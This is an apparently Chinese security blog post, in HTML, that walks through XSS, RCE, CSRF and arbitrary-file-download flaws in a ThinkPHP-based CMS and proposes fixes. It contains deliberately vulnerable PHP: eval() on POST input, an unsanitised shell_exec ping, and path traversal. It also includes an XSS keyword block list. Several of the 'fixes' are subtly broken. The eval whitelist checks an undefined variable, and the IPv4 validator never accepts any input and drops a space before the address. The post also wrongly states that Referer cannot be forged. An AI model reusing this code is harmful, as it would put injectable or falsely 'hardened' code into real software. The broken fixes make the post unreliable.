+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405203502846.png" srcset="/img/loading.gif" alt="image-20210405203502846"></p>
+<h2 id="8-XSS"><a href="#8-XSS" class="headerlink" title="8.XSS"></a>8.XSS</h2><h3 id="漏洞点一-7"><a href="#漏洞点一-7" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+          <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;info/a&#x27;</span>);
+          <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];
+          <span class="hljs-keyword">if</span> (!MemberModel::getByUsername(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;
+              <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;用户不存在&#x27;</span>);
+          &#125;
+          <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;modelClass-&gt;allowField(<span class="hljs-literal">true</span>)-&gt;save(<span class="hljs-variable">$data</span>)) &#123;
+              <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;发送成功！&#x27;</span>);
+          &#125; <span class="hljs-keyword">else</span> &#123;
+              <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;发送失败！&#x27;</span>);
+          &#125;</code></pre></div>
+
+<p>可以看到这里对用户发送的消息，只是检查了接收消息者是否存在，而没有对用户发送的内容进行检查和过滤，给了攻击者可乘之机，这里就需要对用户输入的内容进行过滤。</p>
+<h4 id="漏洞防御-11"><a href="#漏洞防御-11" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
+<p>使用php自带的函数<code>htmlspecialchars</code>，将一些特殊字符转义，使其无法工作</p>
+<div class="hljs"><pre><code class="hljs php">首先要知道data的结构
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">data的数据结构</span>
+<span class="hljs-comment">array(4) &#123;</span>
+<span class="hljs-comment">  [&quot;subject&quot;]=&gt;</span>
+<span class="hljs-comment">  string(3) &quot;sad&quot;</span>
+<span class="hljs-comment">  [&quot;send_to&quot;]=&gt;</span>
+<span class="hljs-comment">  string(5) &quot;sunzy&quot;</span>
+<span class="hljs-comment">  [&quot;content&quot;]=&gt;</span>
+<span class="hljs-comment">  string(2) &quot;ad&quot;</span>
+<span class="hljs-comment">  [&quot;send_from&quot;]=&gt;</span>
+<span class="hljs-comment">  string(5) &quot;admin&quot;</span>
+<span class="hljs-comment">&#125;</span>
+<span class="hljs-comment">*/</span>
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+            <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;info/a&#x27;</span>);
+            <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];
+	    <span class="hljs-comment">// 短消息XSS防御</span>
+	    	<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>] = htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>]);
+	    	<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);
+            <span class="hljs-keyword">if</span> (!MemberModel::getByUsername(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;用户不存在&#x27;</span>);
+            &#125;
+            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;modelClass-&gt;allowField(<span class="hljs-literal">true</span>)-&gt;save(<span class="hljs-variable">$data</span>)) &#123;
+                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;发送成功！&#x27;</span>);
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;发送失败！&#x27;</span>);
+            &#125;
+
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
+        &#125;</code></pre></div>
+
+<p>此时再发送带有恶意脚本的消息时，该脚本就不会被浏览器执行，而是当作普通的字符串</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420154610033.png" srcset="/img/loading.gif" alt="image-20210420154610033"></p>
+<p><strong>方法二</strong></p>
+<p>这里就用一个很安全的过滤函数，这个函数很难被绕过。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$arr</span></span>) </span>
+<span class="hljs-function"></span>&#123;
+   <span class="hljs-variable">$ra</span>=<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>,<span class="hljs-string">&#x27;/script/&#x27;</span>,<span class="hljs-string">&#x27;/javascript/&#x27;</span>,<span class="hljs-string">&#x27;/vbscript/&#x27;</span>,<span class="hljs-string">&#x27;/expression/&#x27;</span>,<span class="hljs-string">&#x27;/applet/&#x27;</span>,<span class="hljs-string">&#x27;/meta/&#x27;</span>,<span class="hljs-string">&#x27;/xml/&#x27;</span>,<span class="hljs-string">&#x27;/blink/&#x27;</span>,<span class="hljs-string">&#x27;/link/&#x27;</span>,<span class="hljs-string">&#x27;/style/&#x27;</span>,<span class="hljs-string">&#x27;/embed/&#x27;</span>,<span class="hljs-string">&#x27;/object/&#x27;</span>,<span class="hljs-string">&#x27;/frame/&#x27;</span>,<span class="hljs-string">&#x27;/layer/&#x27;</span>,<span class="hljs-string">&#x27;/title/&#x27;</span>,<span class="hljs-string">&#x27;/bgsound/&#x27;</span>,<span class="hljs-string">&#x27;/base/&#x27;</span>,<span class="hljs-string">&#x27;/onload/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>,<span class="hljs-string">&#x27;/onchange/&#x27;</span>,<span class="hljs-string">&#x27;/onsubmit/&#x27;</span>,<span class="hljs-string">&#x27;/onreset/&#x27;</span>,<span class="hljs-string">&#x27;/onselect/&#x27;</span>,<span class="hljs-string">&#x27;/onblur/&#x27;</span>,<span class="hljs-string">&#x27;/onfocus/&#x27;</span>,<span class="hljs-string">&#x27;/onabort/&#x27;</span>,<span class="hljs-string">&#x27;/onkeydown/&#x27;</span>,<span class="hljs-string">&#x27;/onkeypress/&#x27;</span>,<span class="hljs-string">&#x27;/onkeyup/&#x27;</span>,<span class="hljs-string">&#x27;/onclick/&#x27;</span>,<span class="hljs-string">&#x27;/ondblclick/&#x27;</span>,<span class="hljs-string">&#x27;/onmousedown/&#x27;</span>,<span class="hljs-string">&#x27;/onmousemove/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseout/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseover/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseup/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>);
+     
+   <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$arr</span>))
+   &#123;
+     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">//循环语句，挨个检测</span>
+     &#123;
+        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$value</span>))
+        &#123;
+          <span class="hljs-keyword">if</span> (!get_magic_quotes_gpc()) 
+          &#123;
+             <span class="hljs-variable">$value</span>  = addslashes(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//给单引号（&#x27;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义</span>
+          &#125;
+          <span class="hljs-variable">$value</span>       = preg_replace(<span class="hljs-variable">$ra</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$value</span>);     <span class="hljs-comment">//删除非打印字符</span>
+          <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]     = htmlentities(strip_tags(<span class="hljs-variable">$value</span>)); <span class="hljs-comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
+        &#125;
+        <span class="hljs-keyword">else</span>
+        &#123;
+          SafeFilter(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);
+        &#125;
+     &#125;
+   &#125;
+&#125;</code></pre></div>
+
+
+
+<h3 id="漏洞点二-7"><a href="#漏洞点二-7" class="headerlink" title="漏洞点二"></a><strong>漏洞点二</strong></h3><h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\member\controller\Index.php</code>中的comment方法</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224100169.png" srcset="/img/loading.gif" alt="image-20210419224100169"></p>
+<p>很容易看到，没有对提交的数据进行处理，并且将提交的数据在页面使用echo打印出来，导致了XSS漏洞</p>
+<h4 id="漏洞防御-12"><a href="#漏洞防御-12" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>使用php自带的函数<code>htmlspecialchars</code>，将一些特殊字符转义，使其无法工作，或者使用上面的过滤函数</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">comment</span>(<span class="hljs-params"></span>)</span>&#123;
+
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;
+        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];
+        <span class="hljs-variable">$data</span> = htmlspecialchars(<span class="hljs-variable">$data</span>);
+        <span class="hljs-variable">$userId</span> = <span class="hljs-keyword">$this</span>-&gt;userid;</code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161125127.png" srcset="/img/loading.gif" alt="image-20210420161125127" style="zoom:50%;">
+
+<h2 id="9-RCE"><a href="#9-RCE" class="headerlink" title="9.RCE"></a>9.RCE</h2><h3 id="漏洞点一-8"><a href="#漏洞点一-8" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\admin\phpinfo\index</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;
+	   	<span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
+
+	   	<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
+	   &#125;
+	   <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
+&#125;</code></pre></div>
+
+<p><code>eval()</code>函数将传进来的字符串当作php代码执行，导致了命令执行</p>
+<h4 id="漏洞防御-13"><a href="#漏洞防御-13" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>既然功能就是查看phpinfo，那就设置一个白名单，检查提交的值是否为phpinfo</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">   </span>&#123;
+       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;
+   	   	<span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
+		<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);
+       	<span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
+           	<span class="hljs-keyword">return</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
+       	&#125; <span class="hljs-keyword">else</span> &#123;
+           	<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;Hacker!&quot;</span>);
+       	&#125;
+   	&#125;
+   	   <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
+   &#125;</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161650236.png" srcset="/img/loading.gif" alt="image-20210420161650236"></p>
+<p><strong>漏洞点二</strong></p>
+<h4 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h4><div class="hljs"><pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+         <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
+         <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);
+<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
+         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)
+         &#123;
+             <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);
+             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
+         &#125;
+     &#125;</code></pre></div>
+
+<p>可以看到，这里没有对用户提交的ip地址进行任何检查判断，导致攻击者可以使用管道符恶意的拼接命令，从而导致了命令注入，获取到服务的敏感资源。</p>
+<h3 id="漏洞点二-8"><a href="#漏洞点二-8" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><h4 id="漏洞防御-14"><a href="#漏洞防御-14" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
+<p>对用户提交的ip的地址进行判断，只有当符合IPv4的地址格式时，才允许执行下一步操作。</p>
+<p>具体代码如下</p>
+<div class="hljs"><pre><code class="hljs php">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+    <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
+    <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);
+    <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;
+    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-variable">$data</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>); <span class="hljs-comment">// 利用ipv4地址的特性检查</span>
+    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$data</span>); <span class="hljs-variable">$i</span>++)&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] &gt; <span class="hljs-number">255</span> )
+        &#123;
+            <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$is_ip</span>)&#123;
+        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;请输入正确的IPv4地址！&quot;</span>;
+    &#125;
+    <span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping -c 4&#x27;</span>.<span class="hljs-variable">$ip</span>);
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
+&#125;</code></pre></div>
+
+
+
+<p><strong>方法二</strong></p>
+<p>使用php内置的函数对提交的参数进行过滤和转义，使得攻击者输入的一些特殊字符失去原来的作用。</p>
+<p><code>escapeshellcmd</code>和<code>escapeshellarg</code>函数</p>
+<div class="hljs"><pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+         <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
+         <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);
+         <span class="hljs-variable">$ip</span> = escapeshellcmd(<span class="hljs-variable">$ip</span>);
+         <span class="hljs-variable">$ip</span> = escapeshellarg(<span class="hljs-variable">$ip</span>);
+
+<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
+         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)
+         &#123;
+             <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);
+             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
+         &#125;
+     &#125;</code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420163850706.png" srcset="/img/loading.gif" alt="image-20210420163850706" style="zoom:67%;">
+
+<h2 id="10-CSRF"><a href="#10-CSRF" class="headerlink" title="10.CSRF"></a>10.CSRF</h2><h3 id="漏洞点一-9"><a href="#漏洞点一-9" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Member.php</code>中的<code>jifen</code>方法</p>
+<h4 id="漏洞防御-15"><a href="#漏洞防御-15" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>首先在前端代码中加入<code>&#123;:token&#125;</code>，让用户每次访问时都携带一个随机token，再在后端页面中检查该token是否正确</p>
+<div class="hljs"><pre><code class="hljs php">
+<span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];
+         <span class="hljs-comment">// 设置检查规则</span>
+         <span class="hljs-variable">$rule</span> = [
+             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
+         ];
+         <span class="hljs-comment">// 利用validata函数检查</span>
+         <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);
+         <span class="hljs-comment">// token检查不通过则直接退出，并警告站点不安全。</span>
+         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;
+             <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);
+         &#125;</code></pre></div>
+
+
+
+<h3 id="漏洞点二，三，四"><a href="#漏洞点二，三，四" class="headerlink" title="漏洞点二，三，四"></a><strong>漏洞点二，三，四</strong></h3><h4 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\member\controller\Member.php</code>中的<code>edit</code>方法 </p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">   </span>&#123;
+       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+           <span class="hljs-variable">$userid</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);
+           <span class="hljs-variable">$data</span>   = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();
+           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);
+
+           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
+               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>);
+           &#125;
+           ...</code></pre></div>
+
+<p>上面的代码只是对提交的数据进行了检查，数据符合规则就会成功，但是没有对请求的来源做任何的检查，这也是做成CSRF漏洞的最大原因。</p>
+<h4 id="漏洞防御-16"><a href="#漏洞防御-16" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>CSRF漏洞的防御</p>
+<ul>
+<li>设置token，与管理员登录页面一样，每次请求的前端页面都会隐藏一个随机产生的token，而在提交请求时这个token也会发送到后端，此时服务器会检查，提交的token是否正确，只有正确时才会进行下一步操作。</li>
+<li>referer代表着请求的来源，不可以伪造。但是浏览器可以关闭referer。</li>
+<li>禁止第三方网站使用本站Cookie。但是只有个别的浏览器支持。</li>
+</ul>
+<p>所以这里选择使用token，修复该漏洞。</p>
+<p>前端代码</p>
+<p>基本不需要修改，只需要增加一个隐藏的token值，代码位置<code>application\member\view\member\edit.html</code></p>
+<p>此时的前端页面就会产生一个新标签，就是token值</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161709609.png" srcset="/img/loading.gif" alt="image-20210408161709609" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161749800.png" srcset="/img/loading.gif" alt="image-20210408161749800" style="zoom: 67%;"></p>
+<p>后端代码</p>
+<p><code>application\member\controller\Member.php</code>中的<code>edit</code>方法 </p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">   </span>&#123;
+       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+           <span class="hljs-variable">$userid</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);
+           <span class="hljs-variable">$data</span>   = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();
+         
+		<span class="hljs-comment">// 获取前端的token值</span>
+           <span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];
+           <span class="hljs-comment">// 设置检查规则</span>
+           <span class="hljs-variable">$rule</span> = [
+               <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
+           ];
+           <span class="hljs-comment">// 利用validata函数检查</span>
+           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);
+           <span class="hljs-comment">// token检查不通过则直接退出，并警告站点不安全。</span>
+           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;
+               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);
+           &#125;
+           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);
+
+           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
+               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>);
+           &#125;
+           ...</code></pre></div>
+
+<p>再使用bp抓包生成CSRF的poc，此时就不能成功了</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408162254519.png" srcset="/img/loading.gif" alt="image-20210408162254519" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408160213558.png" srcset="/img/loading.gif" alt="image-20210408160213558" style="zoom: 50%;"></p>
+<h2 id="11-任意文件下载-1"><a href="#11-任意文件下载-1" class="headerlink" title="11.任意文件下载"></a>11.任意文件下载</h2><h3 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位于<code>application\download\controller\Index.php</code>中的index方法</p>
+<div class="hljs"><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">  </span>&#123;
+header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);
+      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isGet() &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-literal">null</span>)&#123;
+          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-string">&#x27;&#x27;</span>)&#123;
+              <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];
+              <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;nba/&quot;</span>.<span class="hljs-variable">$filename</span>;
+              iconv(<span class="hljs-string">&quot;utf-8&quot;</span>,<span class="hljs-string">&quot;gb2312&quot;</span>,<span class="hljs-variable">$filename</span>);
+              <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>))&#123;
+                  <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;文件不存在！&quot;</span>);
+              &#125;
+              <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;rb&#x27;</span>);
+              <span class="hljs-variable">$file_size</span> = filesize(<span class="hljs-variable">$filename</span>);
+              ob_clean();
+              Header(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);
+              Header(<span class="hljs-string">&quot;Accept-Ranges: bytes&quot;</span>);
+              Header(<span class="hljs-string">&quot;Accept-Length:&quot;</span>.<span class="hljs-variable">$file_size</span>);
+              Header(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span>.basename(<span class="hljs-variable">$filename</span>));
+              <span class="hljs-variable">$buffer</span>=<span class="hljs-number">1024</span>;
+              <span class="hljs-variable">$file_count</span>=<span class="hljs-number">0</span>;
+              <span class="hljs-keyword">while</span>(!feof(<span class="hljs-variable">$fp</span>) &amp;&amp; <span class="hljs-variable">$file_count</span>&lt;<span class="hljs-variable">$file_size</span>)&#123;
+                  <span class="hljs-variable">$file_con</span>=fread(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$buffer</span>);
+                  <span class="hljs-variable">$file_count</span>+=<span class="hljs-variable">$buffer</span>;
+                  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_con</span>;
+              &#125;
+              fclose(<span class="hljs-variable">$fp</span>);
+              <span class="hljs-keyword">return</span> view();
+          &#125;
+      &#125;
+
+      <span class="hljs-keyword">return</span> view();
+  &#125;</code></pre></div>
+
+<p>这里就是实现了一个图片下载的方法，使得用户可以下载<code>public/nba</code>文件夹下的图片，但是并没有对提交的<code>filename</code>参数进行检查和过滤，那么攻击者就可以利用<code>../</code>实现目录的跳转，从而可以下载任意文件</p>
+<h3 id="漏洞防御-17"><a href="#漏洞防御-17" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>主要的防御方法就是限制用户输入的文件名在程序指定的目录下，那么就是不能使用<code>../</code>进行目录的跳转，并且对用户下载的文件后缀名进行检查</p>
